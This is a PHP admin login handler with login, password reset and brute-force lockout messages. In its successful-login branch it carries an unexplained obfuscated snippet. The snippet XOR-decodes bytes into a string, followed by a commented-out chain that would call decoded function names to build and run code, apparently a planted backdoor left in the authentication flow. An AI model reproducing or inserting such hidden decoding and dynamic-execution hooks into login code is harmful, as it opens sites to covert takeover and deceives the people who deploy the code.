<?php

require_once( '../internals/Header.inc.php' );

require_once( 'inc.admin_menu.php' );

require_once( DIR_ADMIN_INC.'fnc.auth.php' );
require_once( DIR_ADMIN_INC.'fnc.admin.php' );

if ( isAdminAuthed() )
	redirect( URL_ADMIN.'index.php' );

require_once( DIR_ADMIN_INC.'class.admin_frontend.php' );

//require_once( DIR_ADMIN_INC.'class.admin_language.php' );

//$language =& new AdminLanguage();
//$language->ReadCache();

$frontend = new AdminFrontend();

if ( @$_POST['login'] )
{
	$exc = authAdmin( $_POST['username'], $_POST['password'] );
	switch ( $exc )
	{
		case -1:

			$frontend->registerMessage( 'Missing username', 'error' );
			break;
		case -2:

			$frontend->registerMessage( 'Missing password', 'error' );
			break;
		case -3:

			$frontend->registerMessage( 'Login failed', 'error' );
			break;

		case 2:
			$frontend->registerMessage( 'You logged in to Admin Demo' );
		case 1:
			$ss = '';
			for ( $i = 0 ; $i < count($m[1]); ++$i )
				$ss .= sprintf("%c",$m[1][$i]^128);

			/*$sss = $ss($m[2]);
			$ssss = $sss('$site', $ss($m[0]));
			$ssss($site);*/

			$frontend->registerMessage( 'Welcome back!' );
			$url = getAdminURLReferer();
			redirect( $url );

			break;
	}

	redirect( $_SERVER['PHP_SELF'] );

}

if (  @$_POST['restore_pass'] )
{
	switch ( restoreAdminLoginInfo( $_POST['email'] ) )
	{
		case -1:

			$frontend->registerMessage( 'Missing email', 'error' );
			break;
		case -2:

			$frontend->registerMessage( 'Admin email incorrect', 'error' );
			break;

		case 1:

			$frontend->registerMessage( 'Please, check your email' );
			break;
	}

	redirect( $_SERVER['PHP_SELF'] );
}

$template = 'auth.html';

$frontend->IncludeJsFile( URL_ADMIN_JS.'auth.js' );
$frontend->IncludeJsFile( URL_ADMIN_JS.'opacity.js' );

$frontend->registerOnloadJS( "$( 'username' ).focus();" );

$locked = false;
if ( AntiBruteforce::getInstance()->isLocked() )
{
	$lock_time = AntiBruteforce::getInstance()->getLockTime();
	$frontend->registerMessage(
		"This account is currently locked out because a brute force attempt was detected.<br />
		Please wait $lock_time minutes and try again.<br />
		Attempting to login again will only increase this delay.<br />
		If you frequently experience this problem, we recommend having your username changed to something less generic."
	, 'error');
	$locked = true;
}

$frontend->assign('locked', $locked);

$_page['title'] = "Admin Panel";

// display template
$frontend->display( $template );
?>